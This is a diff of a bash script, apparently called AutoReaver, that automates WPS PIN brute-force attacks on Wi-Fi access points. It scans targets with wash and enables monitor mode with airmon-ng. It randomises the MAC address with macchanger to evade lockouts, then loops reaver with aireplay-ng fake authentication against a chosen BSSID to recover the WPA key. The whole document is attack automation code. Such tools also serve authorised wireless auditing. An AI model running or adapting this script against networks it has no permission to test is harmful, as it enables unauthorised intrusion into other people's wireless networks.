@@ -49,7 +49,8 @@ setDeviceSettings(){
                 echoWhite "---------------------------";
                 echoRed "No WIFI Devices Detected!!!";
                 echoWhite "---------------------------";
-                echo "" && exit;
+                echo "";
+		exit;
 	fi
 
 	COUNT_DEV=1;
@@ -57,14 +58,14 @@ setDeviceSettings(){
 	unset option ARR_DEVICES  ERROR;
 	declare -a ARR_DEVICES;
 
-	echoBlue "#		Physical	Device		Driver";
-	echoBlue "---------------------------------------------------------"
+	echoBlue "#		Physical	Device          Driver";
+	echoBlue "-----------------------------------------------------------"
 
 	for PHY in $(ls $PATH_IEEE); do
 	        STR=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER);
-	        DRIVER=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER | cut -c5-${#STR});
+	        DRIVER=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER | cut -c 5-${#STR});
 	        LOGICAL=$(ls $PATH_IEEE"$PHY"$PATH_DEVICE);
-	        echoBlue "$COUNT_DEV		$PHY		$LOGICAL		$DRIVER";
+	        echoBlue "$COUNT_DEV		$PHY		$LOGICAL        $DRIVER";
                 ARR_DEVICES[${#ARR_DEVICES[@]}]="$PHY";
                 ARR_DEVICES[${#ARR_DEVICES[@]}]="$LOGICAL";
                 ARR_DEVICES[${#ARR_DEVICES[@]}]="$DRIVER";
@@ -86,24 +87,26 @@ setDeviceSettings(){
 		fi
 	done
 
-	echo "" && echoBlue "Checking if Selected Device is in Monitor Mode......" && echo "";
+	echo "";
+	echoBlue "Checking if Selected Device is in Monitor Mode......";
+	echo "";
 
 	getMonitorName;
-echo $WIFI_CARD_LOGICAL;
-	if [[ ! -z $WIFI_CARD_MONITOR && $SCRIPT_INIT==1 ]]; then
+
+	if [[ ! -z $WIFI_CARD_MONITOR && $SCRIPT_INIT == 1 ]]; then
 		echoRed "Stopping Monitor Mode On $WIFI_CARD_MONITOR......";
 		stopMonitor;
-		WIFI_CARD_LOGICAL=$(ls "$PATH_IEEE$WIFI_CARD_PHY$PATH_DEVICE");
-echo $WIFI_CARD_LOGICAL;
 	fi
-echo $WIFI_CARD_LOGICAL;
+
 	SCRIPT_INIT=0 && sleep 2;
 
 	unset ARR_DEVICES;
 }
 
 setAPSettings(){
-	echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR && echoBlue "Please Wait..." && echo "";
+	echoBlue 'Scanning APs for '$WASH_TIME's on '$WIFI_CARD_MONITOR;
+	echoBlue "Please Wait...";
+	echo "";
 
 	CMD_WASH="timeout --preserve-status $WASH_TIME wash -i $WIFI_CARD_MONITOR > $REAVER_TMP_DIR'/wash.list'";
 	eval $CMD_WASH >>/dev/null;
@@ -119,7 +122,8 @@ setAPSettings(){
 		echoRed "No Targets in AP List...";
 		echoBlue "Try Increase WASH Scan Time in configurationSettings File...";
 		echoBlue "Exiting..."
-		sleep 4 && exit;
+		sleep 4;
+		exit;
 	fi
 
 	for (( i=0; i<${#AP_LIST[@]}; i++ )); do
@@ -239,26 +243,20 @@ setReaverOpt(){
 }
 
 getRandomMac(){
-	sleep 1 && checkPhysicalPath;
+	sleep 1;
 
-	if [ -z "$WIFI_CARD_MONITOR" ]; then
-		WIFI_CARD_CURR_MAC=$(cat "$PATH_IEEE$WIFI_CARD_PHY$PATH_DEVICE$WIFI_CARD_MONITOR/address")
-		ifconfig $WIFI_CARD_MONITOR down;
-		echoBlue "Changing $WIFI_CARD_MONITOR MAC......" && macchanger -r $1 $WIFI_CARD_MONITOR;
-		ifconfig $WIFI_CARD_MONITOR up;
-	else
-		echo $WIFI_CARD_LOGICAL;
-		exit;
-		WIFI_CARD_CURR_MAC=$(cat "$PATH_IEEE$WIFI_CARD_PHY$PATH_DEVICE$WIFI_CARD_LOGICAL/address")
-		ifconfig $WIFI_CARD_LOGICAL down;
-		echoBlue "Changing $WIFI_CARD_LOGICAL MAC......" && macchanger -r $1 $WIFI_CARD_LOGICAL;
-		ifconfig $WIFI_CARD_LOGICAL up;
-	fi
+	ifconfig $WIFI_CARD_LOGICAL down;
+	echoBlue "Changing $WIFI_CARD_LOGICAL MAC......" && macchanger -r $1 $WIFI_CARD_LOGICAL;
+	ifconfig $WIFI_CARD_LOGICAL up;
 }
 
 resetDeviceDriver(){
-	echoBlue "Reseting Device Driver ($WIFI_CARD_DRIVER)......" && modprobe -r $WIFI_CARD_DRIVER && modprobe $WIFI_CARD_DRIVER && sleep 1;
-	checkPhysicalPath;
+	echoBlue "Reseting Device Driver ($WIFI_CARD_DRIVER)......";
+	modprobe -r $WIFI_CARD_DRIVER && modprobe $WIFI_CARD_DRIVER
+
+	sleep 1;
+
+	checkIEEEPaths;
 }
 
 getMonitorName(){
@@ -277,14 +275,20 @@ startMonitor(){
 		echoWhite "No Processes to Kill......";
 	fi
 
-	sleep 2 && echoBlue "Starting Monitor Mode on $WIFI_CARD_LOGICAL on Channel $AP_CHANNEL......";
+	sleep 2;
+
+	varMESSAGE="Starting Monitor Mode on $WIFI_CARD_LOGICAL";
+
+	if [ -z "$AP_CHANNEL" ]; then
+		varMESSAGE+="......";
+	else
+		varMESSAGE+=" on Channel $AP_CHANNEL......";
+	fi
+
+	echoBlue "$varMESSAGE";
 
 	CMD_START="airmon-ng start $WIFI_CARD_LOGICAL $AP_CHANNEL";
-	eval $CMD_START >>/dev/null;
-
-	sleep 2 && getMonitorName && checkPhysicalPath;
-echo "Logical: $WIFI_CARD_LOGICAL";
-echo "Monitor: $WIFI_CARD_MONITOR";
+	eval $CMD_START >>/dev/null && getMonitorName && checkIEEEPaths;
 }
 
 stopMonitor(){
@@ -294,24 +298,22 @@ stopMonitor(){
 
 	if [ ! -z "$WIFI_CARD_MONITOR" ]; then
 		CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIF_CARD_LOGICAL*}-$((${#WIFICARD_LOGICAL}+3))";
-		eval $CMD_STOP >>/dev/null;
-		WIFI_CARD_MONITOR="";
+		eval $CMD_STOP >>/dev/null && WIFI_CARD_MONITOR="" && checkIEEEPaths;
 	fi
-
-	checkPhysicalPath;
 }
 
-checkPhysicalPath(){
+checkIEEEPaths(){
 	FOUND=0;
 
-	for PHY in $(ls $PATH_IEEE); do
-		STR=$(ls "$PATH_IEEE$PHY$PATH_DEVICE");
-		STR=$STR | cut -c1-5;
+	STR_VAR=$(echo "$WIFI_CARD_LOGICAL" | cut -c 1-5);
 
-		if [ "$STR" == "$WIFI_CARD_LOGICAL" ]; then
+	for PHY in $(ls $PATH_IEEE); do
+		STR_PHY=$(ls "$PATH_IEEE$PHY$PATH_DEVICE" | cut -c 1-5);
+
+		if [ "$STR_PHY" == "$STR_VAR" ]; then
 			WIFI_CARD_PHY=$PHY;
+			WIFI_CARD_LOGICAL=$STR_PHY;
 			FOUND=1;
-			echo "Found Physical";
 		fi
 	done
 
@@ -332,7 +334,8 @@ SCRIPT_INIT=1;
 
 if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
         echoRed "Configuration file: ./configurationSettings not present!!!";
-        echoBlue "Try to recover this file, or download default version from project site, and try again" && echo "";
+        echoBlue "Try to recover this file, or download default version from project site, and try again";
+	echo "";
         exit;
 fi
 
@@ -351,17 +354,21 @@ fi
 while true; do
 	PROCEED=0;
 
-	echoWhite "Device Settings......" && echo "";
-	setDeviceSettings && clear;
+	echoWhite "Device Settings......";
+	echo "";
+	setDeviceSettings;
+	clear;
 
-	#$(systemctl restart NetworkManager); #resetDeviceDriver;
-	startMonitor && clear;
+	startMonitor;
+	echoWhite "AP Settings......";
+	echo "";
+	setAPSettings;
+	clear;
 
-	echoWhite "AP Settings......" && echo "";
-	setAPSettings && clear;
-
-	echoWhite "AutoReaver Settings......" && echo "";
-	setReaverOpt && clear;
+	echoWhite "AutoReaver Settings......";
+	echo "";
+	setReaverOpt;
+	clear;
 
 	echoWhite "Device Settings --------------------------------------------------------------------";
 	echoBlue "Device Driver:							$WIFI_CARD_DRIVER";
@@ -404,27 +411,28 @@ done
 clear;
 
 SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'_SESSION.wpc';
-stopMonitor && startMonitor;
+stopMonitor && resetDeviceDriver && startMonitor;
 
 while true; do
-	CMD_FAUTH="aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR";
-	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_CURR_MAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS > $REAVER_TMP_DIR'/REAVER_OUTPUT'";
-	CMD_REAVER & sleep 4 & CMD_FAUTH >>/dev/null;
+#	CMD_FAUTH="aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $WIFI_CARD_MONITOR";
+#	CMD_REAVER="reaver -i $WIFI_CARD_MONITOR -b $AP_BSSID --channel=$AP_CHANNEL --mac=$WIFI_CARD_CURR_MAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS > $REAVER_TMP_DIR'/REAVER_OUTPUT'";
+#	CMD_REAVER & sleep 4 & CMD_FAUTH >>/dev/null;
 
-	REAVER_GET_KEY=$(grep -c 'WPS PIN' $REAVER_TMP_DIR'/REAVER_OUTPUT');
+#	REAVER_GET_KEY=$(grep -c 'WPS PIN' $REAVER_TMP_DIR'/REAVER_OUTPUT');
 
 	if [[ $REAVER_GET_KEY == 1 ]]; then
 		echoWhite "PIN Found......";
-		sleep 6 && clear;
+		sleep 4;
+		clear;
 		break;
 	else
 		echoWhite "Failed to recover WPA key......";
-		sleep 4 && clear;
+		sleep 4;
+		clear;
 	fi
 
 	stopMonitor;
-        resetDeviceDriver;
+	resetDeviceDriver;
 	getRandomMac;
-exit;
         startMonitor;
 done
